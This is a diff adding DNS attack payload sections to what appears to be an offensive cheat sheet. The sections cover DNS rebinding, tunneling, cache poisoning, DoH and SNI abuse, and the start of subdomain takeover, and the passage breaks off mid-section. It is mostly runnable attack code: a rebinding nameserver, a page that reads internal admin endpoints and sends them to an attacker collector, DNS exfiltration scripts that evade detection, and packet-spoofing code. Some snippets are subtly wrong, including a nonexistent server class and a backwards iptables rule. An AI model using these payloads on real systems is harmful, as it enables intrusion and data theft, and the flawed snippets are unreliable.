@@ -1138,3 +1138,1293 @@ echo "[3] DNSSEC validation test"
 dig @$RESOLVER dnssec-failed.org A +dnssec +short 2>/dev/null
 echo "  (SERVFAIL = DNSSEC validation working)"
 ```
+
+---
+
+## 20. DNS Rebinding Payloads (Modern Chains)
+
+Modern DNS rebinding goes beyond the classic two-IP alternation. Real engagements use multi-stage chains (RB-CLICK-style), public-suffix-list bypass, multiple A records served simultaneously, and browser timing tricks. The goal is to defeat the same-origin policy (SOP) and the host of anti-rebinding defenses shipped in modern browsers, frameworks, and routers (e.g., systemd-resolved's `localhost`-blocking, AWS IMDSv2 token requirements, Chrome's Private Network Access headers).
+
+### Classic Two-IP Alternation (Anchor Pattern)
+
+```bash
+# rbndr.us public rebinding service - alternates between two hex-encoded IPs
+# Format: <hex-ip1>.<hex-ip2>.rbndr.us
+# 127.0.0.1 = 7f000001
+# 169.254.169.254 = a9fea9fe (AWS IMDSv1 endpoint)
+# 192.168.1.1   = c0a80101 (typical router)
+
+curl -v "http://7f000001.a9fea9fe.rbndr.us/"
+curl -v "http://c0a80101.7f000001.rbndr.us:8080/"
+
+# Lock to one IP for N queries, then flip (useful for slow page loads)
+# rbndr.us accepts :N suffix to bias the first IP
+curl -v "http://7f000001.a9fea9fe.rbndr.us:5/"
+```
+
+### Self-Hosted Rebinding Nameserver (Stateful)
+
+```python
+#!/usr/bin/env python3
+"""Stateful DNS rebinding server with configurable query-count trigger.
+
+Behavior:
+  - First N queries return the 'external' IP (attacker server) so the
+    victim browser can load the HTML/JS payload.
+  - On query N+1 and later, return the 'internal' IP (127.0.0.1, IMDS,
+    router, etc.) so the same-origin fetch now hits the internal host.
+
+Serves multiple rebinding domains with independent counters.
+"""
+from dnslib import DNSRecord, QTYPE, RR, A
+from dnslib.server import DNSServer, BaseResolver
+from collections import defaultdict
+
+REBIND_DOMAINS = {
+    # domain: (external_ip, internal_ip, trigger_count)
+    "rebind1.attacker.com": ("203.0.113.10", "127.0.0.1", 3),
+    "rebind2.attacker.com": ("203.0.113.10", "169.254.169.254", 5),
+    "rebind3.attacker.com": ("203.0.113.10", "192.168.1.1", 4),
+}
+
+class StatefulRebindResolver(BaseResolver):
+    def __init__(self):
+        self.counters = defaultdict(int)
+
+    def resolve(self, request, handler):
+        qname = str(request.q.qname).rstrip(".")
+        external_ip, internal_ip, trigger = REBIND_DOMAINS.get(
+            qname, ("203.0.113.10", "127.0.0.1", 1)
+        )
+        self.counters[qname] += 1
+        # First `trigger` queries -> external IP, then internal IP forever
+        ip = external_ip if self.counters[qname] <= trigger else internal_ip
+        reply = request.reply()
+        # TTL=0 so browser immediately re-resolves on next fetch
+        reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=0))
+        return reply
+
+if __name__ == "__main__":
+    resolver = StatefulRebindResolver()
+    server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
+    print("[*] Stateful rebinding server listening on 0.0.0.0:53/udp")
+    server.start()
+```
+
+### Multi-A Record Trick (Browser Race)
+
+```bash
+# Some browsers/cache resolvers will pick the first A record from a list.
+# Serving multiple A records simultaneously (attacker + target) lets the
+# attacker win on the first request (page load) and the target on the
+# next (XHR/fetch). This avoids TTL churn entirely.
+
+cat > named_multi_a.conf << 'EOF'
+zone "multi.attacker.com" {
+    type master;
+    file "/etc/bind/db.multi.attacker.com";
+};
+EOF
+
+cat > /etc/bind/db.multi.attacker.com << 'EOF'
+$TTL 0
+@   IN  SOA ns1.attacker.com. admin.attacker.com. (
+            2026010101 ; serial
+            0          ; refresh
+            0          ; retry
+            0          ; expire
+            0          ; minimum
+            )
+@       IN  NS  ns1.attacker.com.
+; Both attacker and internal IPs served together - browser chooses one
+svc     IN  A   203.0.113.10   ; attacker (page load)
+svc     IN  A   127.0.0.1      ; internal (post-rebind XHR)
+EOF
+
+rndc reload
+```
+
+### RB-CLICK-Style Two-Domain Chain
+
+```html
+<!-- RB-CLICK chain: two domains, each rebinding once.
+     Domain A loads the malicious page (resolves to attacker IP).
+     Same-origin XHR uses Domain B which rebinds to internal IP.
+     Defeats Pinning-based defenses that key on host->IP. -->
+<!DOCTYPE html>
+<html>
+<head><title>rebind chain</title></head>
+<body>
+<script>
+(async () => {
+  // Step 1: page was loaded from rebind1.attacker.com (attacker IP)
+  // Step 2: switch the document.domain / use an iframe pointing at the
+  //         second rebinding domain so the XHR hits the internal target.
+  const target = "http://rebind2.attacker.com:80/";
+
+  // Poll until rebind2 flips from attacker IP to internal IP
+  for (let i = 0; i < 60; i++) {
+    try {
+      const r = await fetch(target + "admin", { credentials: "include" });
+      if (r.status !== 0) {
+        const body = await r.text();
+        // Exfiltrate the internal response back to attacker
+        navigator.sendBeacon(
+          "https://collect.attacker.com/hit",
+          JSON.stringify({ code: r.status, body: body.slice(0, 4000) })
+        );
+        break;
+      }
+    } catch (e) { /* SOP error expected while still bound to attacker IP */ }
+    await new Promise(r => setTimeout(r, 1500));
+  }
+})();
+</script>
+</body>
+</html>
+```
+
+### Public Suffix List (PSL) Bypass
+
+```bash
+# Browsers exempt "public suffix" domains (co.uk, amazonaws.com, etc.)
+# from certain cookie/rebinding relaxations. Attackers can register a
+# subdomain on a PSL-listed suffix (e.g. HEROKUAPP.COM used to be on the
+# PSL) to inherit some of the relaxations, or use a custom suffix they
+# control on their own TLD.
+
+# Check if a candidate domain is on the PSL
+python3 -c "
+from publicsuffixlist import PublicSuffixList
+psl = PublicSuffixList()
+for d in ['app.herokuapp.com','static.cloudfront.net','x.github.io','a.attacker.com']:
+    print(d, '->', psl.privatesuffix(d))
+"
+
+# Register a "fake TLD" by running an internal CA/DNS with a suffix you
+# control and pinning it via /etc/hosts on the victim lab machine.
+# (Lab-only - on real victims you cannot edit /etc/hosts without code exec.)
+echo "203.0.113.10  rebind.attacker.local" | sudo tee -a /etc/hosts
+```
+
+### /etc/hosts Override for Lab Reproduction
+
+```bash
+# Lab: pin the rebinding domain so the victim VM resolves it deterministically
+# Useful for SSRF testing against local services in CI pipelines.
+
+# Pre-seed rebind so the first request goes to attacker, then rely on
+# TTL=0 + dnsmasq re-resolution to flip.
+cat > /etc/hosts.rebind << 'EOF'
+203.0.113.10  rebind.lab.local
+EOF
+
+# dnsmasq with --hostsfile to override only the first lookup, then forward
+dnsmasq --no-resolv --server=8.8.8.8 \
+        --addn-hosts=/etc/hosts.rebind \
+        --local-ttl=0 \
+        --listen-address=127.0.0.1 \
+        --port=0 --dns-forward-max=1000
+```
+
+### Bypassing Common Anti-Rebinding Defenses
+
+```bash
+# 1. systemd-resolved blocks responses that resolve a public hostname
+#    to private/loopback ranges when received over DNS-over-TLS. Force UDP:
+dig +notcp @127.0.0.53 rebind.attacker.com
+
+# 2. Chrome Private Network Access (PNA) requires a preflight header from
+#    the public origin. The preflight must return:
+#    Access-Control-Allow-Private-Network: true
+cat > pna_preflight.conf << 'EOF'
+# Apache: header on the public attacker origin
+Header always set Access-Control-Allow-Private-Network "true"
+Header always set Access-Control-Allow-Origin "*"
+EOF
+
+# 3. AWS IMDSv2 requires a token (PUT /latest/api/token). Rebinding alone
+#    cannot fetch the token because the PUT will be preflighted; instead
+#    use a SSRF that supports method=PUT, or chain with a service that
+#    echoes the token (e.g. GCP metadata similar endpoint with MD-flavored
+#    headers).
+curl -X PUT "http://169.254.169.254/latest/api/token" \
+     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+```
+
+### Historical Incident Reproduction (Lab-Only)
+
+```bash
+# Roku / Cast-style rebinding (2018): IoT device browser fetched a
+# "device control" endpoint on 127.0.0.1 after rebinding. Reproduce:
+# - External page at http://rebind.attacker.com:8080/
+# - Internal target: http://127.0.0.1:8060/keypress/Home (Roku ECP)
+curl "http://rebind.attacker.com:8060/keypress/Home"
+
+# Tesla Model S browser rebinding (Peciva 2014): the in-car browser
+# allowed DNS rebinding to reach 127.0.0.1 REST endpoints controlling
+# door locks, sunroof, etc. Reproduce against the lab framework:
+# - Endpoint pattern: http://127.0.0.1:<port>/command/<action>
+curl "http://rebind.attacker.com:8080/command/door_unlock"
+# (Lab fixture only; real-vehicle exploitation is out of scope.)
+```
+
+---
+
+## 21. DNS Tunneling Payloads (Modern)
+
+Modern DNS tunneling extends classic iodine/dnscat2 setups with DNS-over-HTTPS (DoH), DNS-over-TLS (DoT), and DNS-over-QUIC (DoQ) transports. These hide traffic from classic Suricata rules keyed on plaintext UDP/53 and bypass egress filters that block port 53 entirely. Detection pivots to TLS SNI analysis, DoH endpoint allow-listing, and statistical entropy of query names.
+
+### iodine Power-User Configuration
+
+```bash
+# Server: max-throughput iodine setup for big-data exfil
+# -P password, -m 1000 max downstream fragment, -b 1024 max upstream
+sudo iodined -f -c -P 'REPLACE_WITH_LONG_PASSPHRASE' \
+    -m 1000 -b 1024 -t 1 -l 0.0.0.0 \
+    10.53.0.1 t1.REPLACE_WITH_YOUR_DOMAIN
+
+# Multiple parallel iodine servers on different subdomains for bandwidth
+for i in 1 2 3 4; do
+  sudo iodined -f -P "pass${i}" 10.53.${i}.1 t${i}.REPLACE_WITH_YOUR_DOMAIN
+done
+
+# Client: connect with custom resolver + request-pin to avoid leak
+sudo iodine -f -P 'REPLACE_WITH_LONG_PASSPHRASE' \
+    -r 8.8.8.8 \
+    -m 1000 t1.REPLACE_WITH_YOUR_DOMAIN
+
+# Verify the tunnel
+ip addr show dns0
+ping -c 3 10.53.0.1
+
+# SSH-over-iodine (one-shot, no persistent tunnel)
+ssh -o ProxyCommand="iodine -P 'REPLACE_WITH_LONG_PASSPHRASE' \
+     -r 8.8.8.8 t1.REPLACE_WITH_YOUR_DOMAIN" \
+    user@10.53.0.1
+```
+
+### dnscat2 Power-User Configuration
+
+```bash
+# Server: select query types to dodge Suricata signatures, add delay
+ruby dnscat2.rb --secret='REPLACE_WITH_SECRET' \
+    --dns="domain=t1.REPLACE_WITH_YOUR_DOMAIN,host=0.0.0.0,port=53" \
+    --dns-type=TXT \
+    --max-queries=200
+
+# Session command: throttle to 1 query every 5 seconds (low-and-slow)
+# dnscat2> delay 5000
+# dnscat2> set max-input-size 200
+
+# Client: pipe a shell through dnscat2
+./dnscat --host=t1.REPLACE_WITH_YOUR_DOMAIN --secret='REPLACE_WITH_SECRET' \
+         --dns-type=TXT --delay=3000
+
+# Tunnel a reverse port: from server, listen on attacker:8080 and forward
+# through the client to internal target 10.10.10.5:80
+# dnscat2> listen 127.0.0.1:8080 10.10.10.5:80
+```
+
+### DoH Tunneling via curl (Direct)
+
+```bash
+# Tunnel DNS over HTTPS to a public DoH resolver. Hides queries from
+# local Suricata sensors that only watch UDP/53.
+curl -sH 'accept: application/dns-json' \
+     'https://dns.google/resolve?name=t1.REPLACE_WITH_YOUR_DOMAIN&type=A'
+
+# DoH POST with raw wireformat (binary DNS) - harder to log on URL filters
+printf '\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01' \
+  | curl -sH 'content-type: application/dns-message' \
+         --data-binary @- \
+         'https://cloudflare-dns.com/dns-query' \
+  | xxd | head
+
+# Doggo: friendly multi-transport DoH client
+doggo @https://dns.google t1.REPLACE_WITH_YOUR_DOMAIN A
+doggo @tls://1.1.1.1 t1.REPLACE_WITH_YOUR_DOMAIN A
+doggo @quic://dns.adguard.com t1.REPLACE_WITH_YOUR_DOMAIN A
+```
+
+### DoH Tunnel: Custom DoHtunnel Project
+
+```bash
+# Spin up a DoH front: a Python server that accepts DNS wireformat over
+# HTTPS and proxies to a downstream resolver that *we* operate. Use this
+# when the egress proxy allows HTTPS to known domains but blocks UDP/53.
+
+cat > doh_front.py << 'PYEOF'
+#!/usr/bin/env python3
+"""Minimal DoH front proxy. Accepts /dns-query (wireformat) and forwards
+to a local authoritative server (e.g. iodined) that actually serves the
+tunnel zone."""
+from http.server import BaseHTTPRequestHandler, HTTPSHTTPServer
+import socket, struct, subprocess
+
+class DoHHandler(BaseHTTPRequestHandler):
+    def do_post(self):
+        if self.path != "/dns-query":
+            return self.send_error(404)
+        length = int(self.headers.get("Content-Length", 0))
+        query = self.rfile.read(length)
+        # Forward to local iodined on UDP/5353
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(3.0)
+        s.sendto(query, ("127.0.0.1", 5353))
+        try:
+            data, _ = s.recvfrom(4096)
+        except socket.timeout:
+            data = b""
+        self.send_response(200)
+        self.send_header("Content-Type", "application/dns-message")
+        self.end_headers()
+        self.wfile.write(data)
+
+# Run behind a TLS-terminating reverse proxy (nginx/caddy)
+HTTPSHTTPServer(("127.0.0.1", 8053), DoHHandler).serve_forever()
+PYEOF
+
+python3 doh_front.py &
+# Expose via caddy with valid cert for doh.REPLACE_WITH_YOUR_DOMAIN
+```
+
+```caddyfile
+# Caddyfile - terminate TLS for DoH front
+doh.REPLACE_WITH_YOUR_DOMAIN {
+    reverse_proxy 127.0.0.1:8053
+    header Access-Control-Allow-Origin "*"
+}
+```
+
+### DoT Tunneling (TLS over 853)
+
+```bash
+# Use kdig for explicit DoT queries
+kdig -t AAAA t1.REPLACE_WITH_YOUR_DOMAIN @tls://1.1.1.1
+
+# Stunnel: tunnel raw DNS through TLS to your authoritative DoT server
+cat > /etc/stunnel/dot-client.conf << 'EOF'
+[dns]
+client = yes
+accept  = 127.0.0.1:5353
+connect = dot.REPLACE_WITH_YOUR_DOMAIN:853
+verifyChain = yes
+CAfile = /etc/ssl/certs/ca-certificates.crt
+EOF
+
+# Point local resolver at the stunnel-fronted DoT
+echo "nameserver 127.0.0.1:5353" | sudo tee /etc/resolv.conf.d/dot
+
+# Server side (unbound + DoT listener)
+cat > /etc/unbound/unbound.conf.d/dot.conf << 'EOF'
+server:
+    interface: 0.0.0.0
+    port: 853
+    tls-service-key:  "/etc/unbound/dot.key"
+    tls-service-pem:  "/etc/unbound/dot.crt"
+    tls-port: 853
+    do-ip6: no
+EOF
+```
+
+### DNS-over-QUIC (DoQ)
+
+```bash
+# DoQ runs DNS over QUIC (UDP/443). Some next-gen DNS providers (AdGuard,
+# NextDNS) support it. Useful when 853 is blocked but QUIC/443 is allowed.
+
+doggo @quic://dns.adguard.com t1.REPLACE_WITH_YOUR_DOMAIN A
+
+# AdGuard DoQ endpoint: quic://dns.adguard.com:853
+# AdGuard unfiltered:   quic://unencrypted.adguard.org
+dig @quic://dns.adguard.com t1.REPLACE_WITH_YOUR_DOMAIN +quic
+
+# Detection tip: QUIC traffic is encrypted but the SNI is in the TLS
+# handshake. Look for SNI=dns.adguard.com or SNI=doh.REPLACE_WITH_YOUR_DOMAIN.
+tshark -i eth0 -Y "quic && tls.handshake.extensions_server_name" \
+       -T fields -e tls.handshake.extensions_server_name | sort | uniq -c
+```
+
+### Detection Evasion: Encoding Choices
+
+```bash
+# Suricata rule authors look for high-entropy base32/base64 labels.
+# iodine defaults to base32; switch to base64url or hex to dodge naive
+# "is-base32" signatures, or use TXT-only queries to blend with SPF.
+
+# iodine: force base64 (less DNS-safe chars, more bandwidth)
+sudo iodine -P 'pass' -b 1024 -e 'base64' t1.REPLACE_WITH_YOUR_DOMAIN
+
+# Custom exfil: rotate encoding per chunk
+python3 - << 'PYEOF'
+import base64, binascii, os, socket, struct, time, random
+DOMAIN = "exfil.REPLACE_WITH_YOUR_DOMAIN"
+encoders = [
+    lambda b: base64.b32encode(b).decode().rstrip("=").lower(),
+    lambda b: base64.b64encode(b).decode().rstrip("=").replace("+", "-").replace("/", "_"),
+    lambda b: binascii.hexlify(b).decode(),
+]
+data = b"REPLACE_WITH_SENSITIVE_BLOB_IN_LAB_ONLY"
+CHUNK = 40
+for i in range(0, len(data), CHUNK):
+    enc = random.choice(encoders)
+    label = enc(data[i:i+CHUNK])
+    name = f"{i:04d}.{label}.{DOMAIN}"
+    try:
+        socket.gethostbyname(name)
+    except socket.gaierror:
+        pass
+    time.sleep(random.uniform(0.2, 1.5))  # jittered QPS
+PYEOF
+```
+
+### Queries-Per-Second Throttling
+
+```bash
+# Most SIEM rules trigger on >X DNS queries/second per host. Throttle to
+# stay under typical noise floor (~1 QPS average).
+
+# iodine server: cap upstream rate (clients will back off)
+sudo iodined -P 'pass' --max-queries-per-second=5 t1.REPLACE_WITH_YOUR_DOMAIN
+
+# dnscat2: minimum delay between queries (ms)
+# dnscat2> delay 2000
+
+# Custom exfil: token-bucket rate limiter
+python3 - << 'PYEOF'
+import time, socket
+RATE = 0.8  # queries per second
+last = 0.0
+def send(q):
+    global last
+    now = time.time()
+    gap = 1.0 / RATE
+    if now - last < gap:
+        time.sleep(gap - (now - last))
+    try: socket.gethostbyname(q)
+    except: pass
+    last = time.time()
+for i in range(100):
+    send(f"chunk-{i:03d}.exfil.REPLACE_WITH_YOUR_DOMAIN")
+PYEOF
+```
+
+---
+
+## 22. DNS Cache Poisoning (Modern Variants)
+
+Modern cache-poisoning research has moved past Kaminsky-style TXID prediction. The SAD DNS attack (CVE-2020-25705) abuses an ICMP side-channel to determine whether a resolver has an outstanding query for a target name, dramatically shrinking the spoofing window. Other modern vectors include IPID-probing, fragment-prefix attacks, and exploitation of forwarder chains where the upstream resolver does the attacker's bidding for them.
+
+### SAD DNS (CVE-2020-25705) Detection
+
+```bash
+# SAD DNS uses an ICMP "rate limit reached" side channel on the resolver
+# to learn when a victim resolver has an outstanding query. Detect by
+# looking for ICMP "port unreachable" bursts that correlate with DNS
+# queries from the resolver.
+
+# Capture ICMP + DNS together
+sudo tcpdump -i eth0 -n -w saddns.pcap 'icmp or port 53'
+
+# Analyze: count ICMP unreachable per source IP
+tshark -r saddns.pcap -Y 'icmp.type==3' \
+       -T fields -e ip.src | sort | uniq -c | sort -rn | head
+
+# Check Linux kernel DNS ratelimit setting (post-patch kernels are 0)
+sysctl net.ipv4.icmp_ratemask net.ipv4.icmp_ratelimit
+# Mitigation: ensure ratelimit applies to ICMP responses triggered by DNS
+sudo sysctl -w net.ipv4.icmp_msgs_per_sec=1000
+```
+
+### SAD DNS Attack Sketch (Lab-Only)
+
+```python
+#!/usr/bin/env python3
+"""SAD DNS lab reproduction skeleton.
+
+Educational only. Demonstrates the ICMP side-channel oracle used to
+detect when a resolver has an outstanding query for a victim domain.
+DO NOT run against any resolver you do not own.
+"""
+import socket, struct, time, scapy.all as scapy
+
+VICTIM_RESOLVER = "REPLACE_WITH_YOUR_RESOLVER_IP"   # your lab resolver
+TARGET_NAME     = "trigger.REPLACE_WITH_YOUR_DOMAIN"  # your lab domain
+
+def trigger_dns_query(name):
+    """Send a recursive query so the resolver opens an outstanding query."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    q = build_dns_query(name)
+    s.sendto(q, (VICTIM_RESOLVER, 53))
+    return s
+
+def icmp_rate_probe(ip):
+    """Send a burst of UDP packets to a closed port and count ICMP unreachables.
+    A resolver with an outstanding query will hit its ICMP ratelimit and stop
+    sending unreachables -> oracle 'blocked'."""
+    closed_port = 12345
+    ans = scapy.sr1(
+        scapy.IP(dst=ip) / scapy.UDP(dport=closed_port),
+        timeout=2, verbose=0
+    )
+    return 1 if (ans and ans.haslayer(scapy.ICMP)) else 0
+
+# Phase 1: baseline ICMP responses (no outstanding query)
+baseline = icmp_rate_probe(VICTIM_RESOLVER)
+# Phase 2: trigger a query that the resolver must forward, immediately probe
+sock = trigger_dns_query(TARGET_NAME)
+oracle = icmp_rate_probe(VICTIM_RESOLVER)
+print(f"baseline={baseline} during-query={oracle} "
+      "->" , "likely outstanding query" if oracle < baseline else "no outstanding query")
+```
+
+### Fragment-Prefix / IPID-Probing
+
+```bash
+# Some resolvers forward queries over TCP/53 to upstream, which is subject
+# to IP fragmentation. Attacker can race a forged fragment that overwrites
+# the answer section. Detect support by checking IPID predictability.
+
+# Probe IPID pattern: each probe should increment by 1 for global counter
+for i in $(seq 1 8); do
+    hping3 -S -p 80 -c 1 REPLACE_WITH_YOUR_TARGET_IP 2>/dev/null \
+        | awk '/id=/{print $2}'
+done
+# Sequential IDs (1,2,3,...) = vulnerable to fragment prediction.
+
+# Tooling: use 'fragroute' or 'scapy' to inject forged fragments in a lab
+sudo fragroute -f frag.conf REPLACE_WITH_YOUR_TARGET_IP
+
+cat > frag.conf << 'EOF'
+ip_frag 8
+ip_tint 1
+order random
+EOF
+```
+
+### Feamster-Style On-Path Spoofing (Lab)
+
+```python
+#!/usr/bin/env python3
+"""On-path DNS spoofing lab.
+
+When the attacker is on-path (same LAN or compromised gateway), they can
+race the legitimate response. This is the classic 'Feamster-style' attack
+where the attacker guesses the (TXID, source port) tuple or wins the race
+when the resolver's randomization is weak.
+
+Lab-only: run against a resolver you control (e.g. unbound on localhost).
+"""
+import socket, struct, random, time
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff
+
+IFACE         = "eth0"
+VICTIM        = "REPLACE_WITH_VICTIM_IP"
+RESOLVER      = "REPLACE_WITH_RESOLVER_IP"  # your lab resolver
+TARGET_DOMAIN = "spoof.lab.REPLACE_WITH_YOUR_DOMAIN"
+SPOOF_IP      = "203.0.113.99"
+
+def poison(pkt):
+    if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
+        return
+    qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
+    if TARGET_DOMAIN not in qname:
+        return
+    # Race the legitimate response with our own
+    txid = pkt[DNS].id
+    spoof = (IP(src=RESOLVER, dst=VICTIM) /
+             UDP(sport=53, dport=pkt[UDP].sport) /
+             DNS(id=txid, qr=1, qd=pkt[DNSQR],
+                 an=DNSRR(rrname=pkt[DNSQR].qname, type="A",
+                           rdata=SPOOF_IP, ttl=300)))
+    send(spoof, iface=IFACE, verbose=0)
+    print(f"[+] raced TXID={txid:04x} -> {SPOOF_IP}")
+
+print(f"[*] Sniffing DNS queries for *{TARGET_DOMAIN}* on {IFACE}")
+sniff(iface=IFACE, filter="udp port 53", prn=poison, store=0)
+```
+
+### Forwarder Chain Exploitation
+
+```bash
+# Many enterprises chain resolvers: client -> site forwarder -> corporate
+# -> ISP. If any link does NOT require DNSSEC validation, the upstream
+# link is the weak point.
+
+# Probe forwarder behavior from inside the network
+dig @site-forwarder.internal example.com A +dnssec +cd
+# +cd = checking disabled. If forwarder forwards 'cd' bit to upstream that
+# honors it, attacker-controlled responses bypass validation.
+
+# Identify forwarder hops via TXT fingerprinting (some append chain info)
+dig @site-forwarder.internal version.bind chaos txt +short
+dig @site-forwarder.internal hostname.bind chaos txt +short
+
+# Test that downstream trust the upstream by spoofing a response at the
+# upstream boundary and observing the site forwarder cache it.
+dig @site-forwarder.internal test.REPLACE_WITH_YOUR_DOMAIN A +short
+```
+
+### DNSSEC-Not-Required Targets
+
+```bash
+# Even if the recursive resolver validates DNSSEC, an unsigned zone can
+# still be spoofed. Enumerate unsigned subdomains of the victim.
+
+# Find subdomains with no DS record (no DNSSEC delegation)
+for sub in www mail vpn api dev staging; do
+    name="${sub}.REPLACE_WITH_YOUR_DOMAIN"
+    ds=$(dig +short $name DS)
+    rrsig=$(dig +short $name A +dnssec | grep RRSIG)
+    if [ -z "$ds" ] && [ -z "$rrsig" ]; then
+        echo "[UNSIGNED] $name"
+    fi
+done
+
+# Unsigned + non-DNSSEC-validating resolver = spoofable
+```
+
+---
+
+## 23. DoH / DoT / DoQ Attack Payloads
+
+Attackers don't just tunnel *over* DoH/DoT/DoQ - they also attack the DoH infrastructure itself: enumerating records via the JSON API without touching UDP/53, detecting which DoH proxy a victim is using, manipulating TLS SNI to defeat filtering, and abusing ESNI/ECH to hide the real query target.
+
+### Server-Side Enumeration via DoH JSON API
+
+```bash
+# Cloudflare DoH JSON endpoint - no DNS client required, ideal for
+# restricted environments where only HTTPS egress is allowed.
+curl -sH 'accept: application/dns-json' \
+     'https://cloudflare-dns.com/dns-query?name=REPLACE_WITH_YOUR_DOMAIN&type=A' \
+     | jq '.Answer[]'
+
+# Google DoH JSON - supports Name Minimization bypass (returns full chain)
+curl -s 'https://dns.google/resolve?name=REPLACE_WITH_YOUR_DOMAIN&type=MX' \
+     | jq '.Authority[]'
+
+# Multi-type enumeration over DoH
+for t in A AAAA MX NS TXT SOA CAA SRV CNAME; do
+    echo "=== $t ==="
+    curl -sH 'accept: application/dns-json' \
+         "https://dns.google/resolve?name=REPLACE_WITH_YOUR_DOMAIN&type=${t}" \
+         | jq -c '{Status, Answer}'
+done
+```
+
+```python
+#!/usr/bin/env python3
+"""Pure-DoH subdomain brute forcer. No UDP/53 traffic - useful in networks
+that block outbound 53 entirely. Round-robins across public DoH endpoints
+to dodge rate limits."""
+import requests, itertools, time
+
+DOMAIN = "REPLACE_WITH_YOUR_DOMAIN"
+WORDLIST = "/usr/share/wordlists/dnsrecon/namelist.txt"
+DOH_ENDPOINTS = [
+    "https://dns.google/resolve",
+    "https://cloudflare-dns.com/dns-query",
+    "https://dns.quad9.net:5053/dns-query",
+    "https://doh.opendns.com/dns-query",
+]
+ep = itertools.cycle(DOH_ENDPOINTS)
+
+with open(WORDLIST) as f:
+    for line in f:
+        sub = line.strip()
+        if not sub:
+            continue
+        host = f"{sub}.{DOMAIN}"
+        url = next(ep)
+        try:
+            r = requests.get(url,
+                             params={"name": host, "type": "A"},
+                             headers={"accept": "application/dns-json"},
+                             timeout=4)
+            data = r.json()
+            if data.get("Answer"):
+                addrs = ",".join(a["data"] for a in data["Answer"]
+                                 if a.get("type") == 1)
+                print(f"[+] {host} -> {addrs}")
+        except Exception:
+            pass
+        time.sleep(0.1)  # be polite to public DoH
+```
+
+### Client-Side DoH Proxy Detection
+
+```bash
+# Detect whether a victim host is using a third-party DoH proxy (e.g.
+# Cloudflare, NextDNS) by observing the TLS SNI of outgoing 443 traffic.
+
+sudo tshark -i eth0 -Y 'tls.handshake.type==1 && tcp.port==443' \
+    -T fields -e tls.handshake.extensions_server_name \
+    | sort | uniq -c | sort -rn | head
+
+# Known DoH SNIs to alert on:
+#   dns.google
+#   cloudflare-dns.com
+#   dns.quad9.net
+#   doh.opendns.com
+#   dns.nextdns.io
+#   dns.adguard.com
+#   mozilla.cloudflare-dns.com   (Firefox default)
+
+# Detect DoH by IP destination (well-known DoH endpoints)
+for ip in 8.8.8.8 8.8.4.4 1.1.1.1 1.0.0.1 9.9.9.9 149.112.112.112; do
+    echo -n "$ip: "
+    curl -s -o /dev/null -w '%{http_code}\n' \
+         --max-time 3 \
+         "https://${ip}/dns-query?name=example.com&type=A" \
+         -H 'accept: application/dns-message'
+done
+```
+
+### TLS SNI Manipulation
+
+```bash
+# Domain fronting-style: present an allowed SNI but actually reach a
+# different DoH endpoint via the Host header. Useful when an egress
+# proxy allow-lists SNI=dns.google but you want to reach your own server.
+
+# curl with explicit SNI override
+curl -svk --resolve doh.REPLACE_WITH_YOUR_DOMAIN:443:1.2.3.4 \
+     -H 'Host: dns.google' \
+     'https://doh.REPLACE_WITH_YOUR_DOMAIN/dns-query?name=test&type=A'
+
+# Python SNI manipulation via custom SSLContext
+python3 - << 'PYEOF'
+import ssl, socket, http.client
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+# Present SNI=dns.google but connect to attacker IP
+ctx.set_servername_callback(lambda sslsock, name, ctx: None)
+conn = http.client.HTTPSConnection("1.2.3.4", 443, context=ctx)
+conn.putrequest("GET", "/dns-query?name=test&type=A", skip_host=True)
+conn.putheader("Host", "dns.google")
+conn.endheaders()
+resp = conn.getresponse()
+print(resp.status, resp.read()[:200])
+PYEOF
+```
+
+### ESNI / ECH Bypass Tactics
+
+```bash
+# Encrypted Client Hello (ECH, formerly ESNI) encrypts the SNI inside the
+# TLS ClientHello using an HPKE-encrypted inner SNI. The outer SNI becomes
+# a public front name (e.g. cloudflare-ech.com). Detection pivots to:
+
+# 1. Identify ECH usage: look for extension type 0xFE0D in ClientHello
+sudo tshark -i eth0 -Y 'tls.handshake.type==1' \
+    -V -o 'tls.keys_list:...' \
+    | grep -A2 -i 'ECH|encrypted_client_hello|extension: 65037'
+
+# 2. ECH config is published in DNS as HTTPS/SVCB records with ech=...
+dig REPLACE_WITH_YOUR_DOMAIN HTTPS +short | grep -o 'ech=[A-Za-z0-9+/=]*'
+
+# 3. Bypass ECH by attacking the public DNS resolver to strip HTTPS records
+#    (cache poison / downgrade), forcing the client to fall back to plain
+#    ClientHello with cleartext SNI.
+
+# 4. Block ECH entirely at egress by dropping ClientHello >512 bytes
+#    (ECH adds ~400 bytes). iptables rule:
+sudo iptables -A OUTPUT -p tcp --dport 443 \
+    -m length --length 0:512 -j REJECT
+```
+
+### DoH Server-Side Fingerprinting
+
+```bash
+# Identify which DoH server software a custom endpoint runs by probing
+# uncommon types and observing error responses.
+
+for ep in https://doh.REPLACE_WITH_YOUR_DOMAIN/dns-query \
+          https://dns.google/resolve \
+          https://cloudflare-dns.com/dns-query; do
+    echo "=== $ep ==="
+    # Send malformed query - software stack leaks in error message
+    curl -s -o /dev/null -w 'status=%{http_code} size=%{size_download}\n' \
+         -H 'content-type: application/dns-message' \
+         --data-binary 'XXXX' "$ep"
+    # Send unsupported type (e.g. ANY)
+    curl -sH 'accept: application/dns-json' \
+         "${ep}?name=test&type=ANY" | head -c 200
+    echo
+done
+
+# Common fingerprints:
+#   Cloudflare: 400 + 'Unsupported type' for ANY
+#   dnsdist:    500 + HTML error page
+#   unbound:    SERVFAIL JSON
+#   knot-resolver: 501 + json {'error':...}
+```
+
+---
+
+## 24. Subdomain Takeover Payloads
+
+Subdomain takeover occurs when a CNAME points to a deprovisioned cloud resource whose DNS record remains dangling. The attacker re-registers the resource on the provider and serves content from the victim's subdomain - inheriting the victim's TLS certificates (via ACME HTTP-01 in some cases) and brand trust.
+
+### CNAME Discovery and Dangling Detection
+
+```bash
+# Step 1: collect all CNAMEs from prior enumeration
